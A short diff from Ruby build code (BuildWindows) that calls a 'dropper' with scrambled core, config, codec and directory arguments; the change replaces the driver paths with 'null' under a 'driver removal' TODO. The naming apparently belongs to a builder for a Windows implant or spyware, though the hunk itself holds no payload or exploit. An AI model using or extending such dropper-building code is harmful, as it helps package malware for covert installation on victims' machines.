@@ -165,8 +165,13 @@ class BuildWindows < Build
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                           (bit64 ? path(@scrambled[:core64]) : 'null') +' '+
                                           path(@scrambled[:config])+' '+
-                                          path(@scrambled[:driver])+' '+
-                                          (bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+
+                                          # TODO: driver removal
+                                          'null ' +
+                                          'null ' +
+                                          #path(@scrambled[:driver])+' '+
+                                          #(bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+
                                           (codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           manifest +' '+
